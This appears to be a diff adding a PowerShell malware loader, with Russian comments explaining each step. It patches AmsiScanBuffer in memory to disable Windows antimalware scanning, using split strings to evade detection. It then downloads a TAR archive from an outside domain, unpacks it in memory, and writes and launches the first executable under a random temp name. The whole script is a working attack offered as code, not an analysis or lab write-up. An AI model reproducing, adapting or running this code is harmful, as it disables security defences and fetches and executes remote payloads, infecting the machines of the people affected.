@@ -1,0 +1,154 @@
+# Проверка, загружен ли класс 'Program' в текущий AppDomain
+if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
+          ForEach-Object { $_.GetTypes() } |
+          Where-Object { $_.FullName -eq 'Program' })) {
+
+    # Определение класса C# 'Program' с методами для манипуляции защитой памяти и патчингом функции
+    $data = @"
+    using System;
+    using System.Runtime.InteropServices;
+
+    public class Program
+    {
+        // Импорт GetProcAddress из kernel32.dll для получения адреса функции в DLL
+        [DllImport("kernel32")]
+        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        // Импорт LoadLibrary из kernel32.dll для загрузки DLL в адресное пространство процесса
+        [DllImport("kernel32")]
+        public static extern IntPtr LoadLibrary(string name);
+
+        // Импорт VirtualProtect из kernel32.dll для изменения защиты на области выделенных страниц
+        [DllImport("kernel32")]
+        public static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);
+
+        // Метод для патчинга функции AMSI (Antimalware Scan Interface)
+        public static void Run()
+        {
+            // Загрузка DLL AMSI
+            IntPtr lib = LoadLibrary("a"+"m"+"si."+"dll");
+
+            // Получение адреса функции AmsiScanBuffer
+            IntPtr amsi = GetProcAddress(lib, "Am"+"s"+"iScan"+"B"+"uffer");
+
+            // Вычисление адреса для патчинга
+            IntPtr final = IntPtr.Add(amsi, 0x84);
+
+            // Изменение защиты памяти для разрешения записи
+            uint old = 0;
+            VirtualProtect(final, (UInt32)0x1, 0x40, out old);
+
+            // Патчинг функции путем записи одного байта
+            byte[] patch = new byte[] { 0x75 };
+            Marshal.Copy(patch, 0, final, 1);
+
+            // Восстановление оригинальной защиты памяти
+            VirtualProtect(final, (UInt32)0x1, old, out old);
+        }
+    }
+"@
+
+    # Добавление класса C# в текущую сессию
+    Add-Type $data -Language CSharp
+}
+
+# Выполнение метода Run класса Program
+[Program]::Run()
+
+# Проверка, загружен ли класс 'TarExtractor' в текущий AppDomain
+if (-not ([AppDomain]::CurrentDomain.GetAssemblies() |
+          ForEach-Object { $_.GetTypes() } |
+          Where-Object { $_.FullName -eq 'TarExtractor' })) {
+
+    # Определение класса C# 'TarExtractor' для извлечения файлов из TAR-архива в памяти
+    $tarExtractorCode = @"
+    using System;
+    using System.IO;
+    using System.Collections.Generic;
+
+    public class TarExtractor
+    {
+        // Метод для извлечения файлов из TAR-архива, хранящегося в памяти
+        public static Dictionary<string, byte[]> ExtractTarFromMemory(byte[] tarData)
+        {
+            var extractedFiles = new Dictionary<string, byte[]>();
+
+            using (var memoryStream = new MemoryStream(tarData))
+            {
+                while (memoryStream.Position < memoryStream.Length)
+                {
+                    // Чтение заголовка каждого файла в TAR-архиве
+                    byte[] header = new byte[512];
+                    memoryStream.Read(header, 0, 512);
+
+                    // Извлечение имени файла из заголовка
+                    string fileName = System.Text.Encoding.ASCII.GetString(header, 0, 100).Trim('\0');
+                    if (string.IsNullOrEmpty(fileName)) break;
+
+                    // Извлечение размера файла из заголовка (в восьмеричном формате)
+                    string fileSizeOctal = System.Text.Encoding.ASCII.GetString(header, 124, 12).Trim('\0').Trim();
+                    long fileSize = Convert.ToInt64(fileSizeOctal, 8);
+
+                    // Чтение данных файла
+                    byte[] fileData = new byte[fileSize];
+                    memoryStream.Read(fileData, 0, fileData.Length);
+
+                    // Добавление файла в словарь
+                    extractedFiles.Add(fileName, fileData);
+// Пропуск заполнения до следующего 512-байтного блока
+                    long padding = 512 - (memoryStream.Position % 512);
+                    if (padding < 512)
+                    {
+                        memoryStream.Seek(padding, SeekOrigin.Current);
+                    }
+                }
+            }
+
+            return extractedFiles;
+        }
+    }
+"@
+
+    # Добавление класса C# в текущую сессию
+    Add-Type -TypeDefinition $tarExtractorCode -Language CSharp
+}
+
+# Пауза выполнения на 10 секунд
+Start-Sleep -Seconds 10
+
+# URL TAR-файла для загрузки
+$tarUrl = "https://1win1.lol/BagsThroat.tar"
+
+# Создание WebClient для загрузки TAR-файла
+$webClient = New-Object System.Net.WebClient
+
+# Загрузка данных TAR-файла
+$tarData = $webClient.DownloadData($tarUrl)
+
+# Извлечение файлов из загруженных данных TAR
+$extractedFiles = [TarExtractor]::ExtractTarFromMemory($tarData)
+
+# Создание временного каталога для хранения извлеченных файлов
+$tempDir = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.Guid]::NewGuid().ToString())
+New-Item -ItemType Directory -Path $tempDir | Out-Null
+
+# Перебор извлеченных файлов
+foreach ($file in $extractedFiles.Keys) {
+    # Проверка, является ли файл исполняемым
+    if ($file -match "\.exe$") {
+        # Генерация случайного имени для исполняемого файла
+        $randomExeName = -join ((0..3) | ForEach-Object { (65..90) + (97..122) | Get-Random | % {[char]$_} }) + ".tmp.exe"
+
+        # Комбинирование пути временного каталога со случайным именем исполняемого файла
+        $exeFilePath = [System.IO.Path]::Combine($tempDir, $randomExeName)
+
+        # Запись исполняемого файла на диск
+        [System.IO.File]::WriteAllBytes($exeFilePath, $extractedFiles[$file])
+
+        # Выполнение извлеченного исполняемого файла
+        Start-Process -FilePath $exeFilePath
+
+        # Выход из цикла после выполнения первого исполняемого файла
+        break
+    }
+}
